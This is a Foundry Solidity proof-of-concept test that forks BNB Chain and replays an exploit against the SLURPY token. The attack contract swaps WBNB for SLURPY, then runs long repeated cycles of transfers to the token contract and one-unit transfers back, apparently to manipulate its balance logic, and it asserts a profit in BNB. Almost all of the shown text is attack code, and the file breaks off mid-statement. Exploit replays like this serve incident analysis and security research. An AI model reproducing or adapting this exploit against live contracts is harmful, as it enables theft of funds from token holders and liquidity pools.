
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 44990634;
    uint256 constant TX_TIMESTAMP = 1734552916;
    uint256 constant TX_BLOCK_NUMBER = 44990635;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        _runExploit();
    }

    function _runExploit() internal {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack;
        if (ATTACK_CONTRACT != address(0)) {
            _installRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
        _etchHelpers();
        attack.bindHelper(Addresses.attack_helper);
        _expectOutcome(address(attack), Addresses.attack_helper);
        _snapProfit();
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _installRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(ATTACK_CONTRACT);
    }

    function _etchHelpers() internal {
        vm.etch(Addresses.attack_helper, type(AttackerHelper).runtimeCode);
        vm.allowCheatcodes(Addresses.attack_helper);
        vm.etch(Addresses.attack_helper_18AE, type(AttackerHelper).runtimeCode);
        vm.allowCheatcodes(Addresses.attack_helper_18AE);
        vm.etch(Addresses.attack_helper_9493, type(AttackerHelper).runtimeCode);
        vm.allowCheatcodes(Addresses.attack_helper_9493);
        vm.etch(Addresses.attack_helper_DEA3, type(AttackerHelper).runtimeCode);
        vm.allowCheatcodes(Addresses.attack_helper_DEA3);
        vm.etch(Addresses.attack_helper_05D0, type(AttackerHelper).runtimeCode);
        vm.allowCheatcodes(Addresses.attack_helper_05D0);
        vm.etch(Addresses.attack_helper_9D95, type(AttackerHelper).runtimeCode);
        vm.allowCheatcodes(Addresses.attack_helper_9D95);
        vm.etch(Addresses.attack_helper_73DD, type(AttackerHelper).runtimeCode);
        vm.allowCheatcodes(Addresses.attack_helper_73DD);
        vm.etch(Addresses.attack_helper_0928, type(AttackerHelper).runtimeCode);
        vm.allowCheatcodes(Addresses.attack_helper_0928);
    }

    function _expectOutcome(address attack, address helper) internal {
        attack;
        helper;
        _expectProfit(Addresses.attack_contract, attack, Addresses.ZERO, "BNB", 7411804202305118343);
    }
}

contract OurAttack {




    AttackerHelper public helper;

    function attack() external payable {
        _attack();
    }

    function flashCallback() internal {
        _markCallback(0);
        flashCallback2();
        flashCallback3();
        flashCallback4();
        flashCallback5();
        flashCallback6();
        flashCallback7();
        flashCallback8();
    }

    function flashCallback2() internal {
        Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(0)), bytes32(uint256(0)));
        IERC20Like(Addresses.WBNB).balanceOf(address(this));
        {
            uint256 wbnbApproveAllowance = type(uint256).max;
            IERC20Like(Addresses.WBNB).approve(Addresses.A_10ED43_024E, wbnbApproveAllowance);
        }
        IContract_10ED43_024E(Addresses.A_10ED43_024E)
            .swapTokensForExactTokens(
                1300000000000000000000000,
                922193874297956552,
                _addressArray2(Addresses.WBNB, Addresses.SLURPY),
                address(this),
                1734552916
            );
        {
            Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(0)), bytes32(uint256(0)));
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 slurpyTransferAmount = 37200882571545369311135;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, slurpyTransferAmount);
            }
            {
                uint256 slurpyTransferAmount_2 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), slurpyTransferAmount_2);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount);
            }
            {
                uint256 slurpyTransferAmount_3 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), slurpyTransferAmount_3);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_2 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_2);
            }
            {
                uint256 slurpyTransferAmount_4 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), slurpyTransferAmount_4);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_3 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_3);
            }
            {
                uint256 slurpyTransferAmount_5 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), slurpyTransferAmount_5);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_4 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_4);
            }
            {
                uint256 slurpyTransferAmount_6 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), slurpyTransferAmount_6);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_5 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_5);
            }
            {
                uint256 slurpyTransferAmount_7 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), slurpyTransferAmount_7);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_6 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_6);
            }
            {
                uint256 slurpyTransferAmount_8 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), slurpyTransferAmount_8);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_7 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_7);
            }
            {
                uint256 slurpyTransferAmount_9 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), slurpyTransferAmount_9);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_8 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_8);
            }
            {
                uint256 slurpyTransferAmount_10 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), slurpyTransferAmount_10);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_9 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_9);
            }
            {
                uint256 slurpyTransferAmount_11 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), slurpyTransferAmount_11);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_10 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_10);
            }
            {
                uint256 slurpyTransferAmount_12 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), slurpyTransferAmount_12);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_11 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_11);
            }
            {
                uint256 slurpyTransferAmount_13 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), slurpyTransferAmount_13);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_12 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_12);
            }
            {
                uint256 slurpyTransferAmount_14 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), slurpyTransferAmount_14);
            }
        }
        IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
        IERC20Like(Addresses.SLURPY).balanceOf(address(this));
        IContract_10ED43_024E(Addresses.A_10ED43_024E)
            .swapTokensForExactTokens(
                1299708485866063974924920,
                920619266262667679,
                _addressArray2(Addresses.WBNB, Addresses.SLURPY),
                address(this),
                1734552916
            );
        {
            Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(0)), bytes32(uint256(0)));
            {
                uint256 transferLiveAmount_13 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_13);
            }
            {
                uint256 transferLiveAmount_14 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_14);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_15 = 73953382326781345291820;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_15);
            }
            {
                uint256 transferLiveAmount_16 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_16);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_17 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_17);
            }
            {
                uint256 transferLiveAmount_18 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_18);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_19 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_19);
            }
            {
                uint256 transferLiveAmount_20 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_20);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_21 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_21);
            }
            {
                uint256 transferLiveAmount_22 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_22);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_23 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_23);
            }
            {
                uint256 transferLiveAmount_24 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_24);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_25 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_25);
            }
            {
                uint256 transferLiveAmount_26 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_26);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_27 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_27);
            }
            {
                uint256 transferLiveAmount_28 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_28);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_29 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_29);
            }
            {
                uint256 transferLiveAmount_30 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_30);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_31 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_31);
            }
            {
                uint256 transferLiveAmount_32 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_32);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_33 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_33);
            }
            {
                uint256 transferLiveAmount_34 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_34);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_35 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_35);
            }
            {
                uint256 transferLiveAmount_36 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_36);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
        }
        IContract_10ED43_024E(Addresses.A_10ED43_024E)
            .swapTokensForExactTokens(
                1236446940532278012487789,
                881781079698977377,
                _addressArray2(Addresses.WBNB, Addresses.SLURPY),
                address(this),
                1734552916
            );
        {
            Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(0)), bytes32(uint256(0)));
            {
                uint256 transferLiveAmount_37 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_37);
            }
            {
                uint256 transferLiveAmount_38 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_38);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_39 = 75223599304950202421713;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_39);
            }
            {
                uint256 transferLiveAmount_40 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_40);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_41 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_41);
            }
            {
                uint256 transferLiveAmount_42 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_42);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_43 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_43);
            }
            {
                uint256 transferLiveAmount_44 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_44);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_45 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_45);
            }
            {
                uint256 transferLiveAmount_46 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_46);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_47 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_47);
            }
            {
                uint256 transferLiveAmount_48 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_48);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_49 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_49);
            }
            {
                uint256 transferLiveAmount_50 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_50);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_51 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_51);
            }
            {
                uint256 transferLiveAmount_52 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_52);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_53 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_53);
            }
            {
                uint256 transferLiveAmount_54 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_54);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_55 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_55);
            }
            {
                uint256 transferLiveAmount_56 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_56);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_57 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_57);
            }
            {
                uint256 transferLiveAmount_58 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_58);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_59 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_59);
            }
            {
                uint256 transferLiveAmount_60 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_60);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
        }
        IContract_10ED43_024E(Addresses.A_10ED43_024E)
            .swapTokensForExactTokens(
                1234669530380709210169010,
                883157917760518404,
                _addressArray2(Addresses.WBNB, Addresses.SLURPY),
                address(this),
                1734552916
            );
        {
            Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(0)), bytes32(uint256(0)));
            {
                uint256 transferLiveAmount_61 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_61);
            }
            {
                uint256 transferLiveAmount_62 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_62);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_63 = 75259283994749418549623;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_63);
            }
            {
                uint256 transferLiveAmount_64 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_64);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_65 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_65);
            }
            {
                uint256 transferLiveAmount_66 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_66);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_67 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_67);
            }
            {
                uint256 transferLiveAmount_68 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_68);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_69 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_69);
            }
            {
                uint256 transferLiveAmount_70 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_70);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_71 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_71);
            }
            {
                uint256 transferLiveAmount_72 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_72);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_73 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_73);
            }
            {
                uint256 transferLiveAmount_74 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_74);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_75 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_75);
            }
            {
                uint256 transferLiveAmount_76 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_76);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_77 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_77);
            }
            {
                uint256 transferLiveAmount_78 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_78);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_79 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_79);
            }
            {
                uint256 transferLiveAmount_80 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_80);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_81 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_81);
            }
            {
                uint256 transferLiveAmount_82 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_82);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_83 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_83);
            }
            {
                uint256 transferLiveAmount_84 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_84);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
        }
        IContract_10ED43_024E(Addresses.A_10ED43_024E)
            .swapTokensForExactTokens(
                1234619596919737726593873,
                885681002121473749,
                _addressArray2(Addresses.WBNB, Addresses.SLURPY),
                address(this),
                1734552916
            );
        {
            Harness.vmExt().store(Addresses.attack_contract, bytes32(uint256(0)), bytes32(uint256(0)));
            {
                uint256 transferLiveAmount_85 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_85);
            }
            {
                uint256 transferLiveAmount_86 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_86);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_87 = 75260286495500045735988;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_87);
            }
            {
                uint256 transferLiveAmount_88 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_88);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_89 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_89);
            }
            {
                uint256 transferLiveAmount_90 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_90);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_91 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_91);
            }
            {
                uint256 transferLiveAmount_92 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_92);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_93 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_93);
            }
            {
                uint256 transferLiveAmount_94 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_94);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_95 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_95);
            }
            {
                uint256 transferLiveAmount_96 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_96);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_97 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_97);
            }
            {
                uint256 transferLiveAmount_98 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_98);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_99 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_99);
            }
            {
                uint256 transferLiveAmount_100 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_100);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_101 = 100000000000000000000000;
                IERC20Like(Addresses.SLURPY).transfer(Addresses.SLURPY, transferLiveAmount_101);
            }
            {
                uint256 transferLiveAmount_102 = 1;
                IERC20Like(Addresses.SLURPY).transfer(address(this), transferLiveAmount_102);
            }
            IERC20Like(Addresses.SLURPY).balanceOf(Addresses.SLURPY);
            IERC20Like(Addresses.SLURPY).balanceOf(address(this));
            {
                uint256 transferLiveAmount_103 = 100000000000000000000000;
